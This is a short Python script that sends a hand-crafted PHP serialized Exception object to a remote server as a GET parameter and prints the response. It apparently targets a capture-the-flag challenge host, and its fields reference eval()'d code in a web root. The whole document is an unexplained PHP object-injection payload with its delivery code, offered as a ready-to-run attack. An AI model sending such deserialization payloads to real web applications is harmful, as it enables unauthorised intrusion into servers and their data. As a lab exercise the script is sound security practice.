import requests

PATH = 'http://s1.r3.ret.sh.cn:31951/'
payload = """O:9:"Exception":7:{s:10:"*message";s:15:"hello exception";s:17:"Exceptionstring";s:0:"";s:7:"*code";i:0;s:7:"*file";s:42:"/var/www/html/index.php(1) : eval()'d code";s:7:"*line";i:1;s:16:"Exceptiontrace";a:1:{i:0;a:3:{s:4:"file";s:23:"/var/www/html/index.php";s:4:"line";i:1;s:8:"function";s:4:"eval";}}s:19:"Exceptionprevious";N;}"""

response = requests.get(PATH, params={'data': payload})
print(response.text)
print(response.url)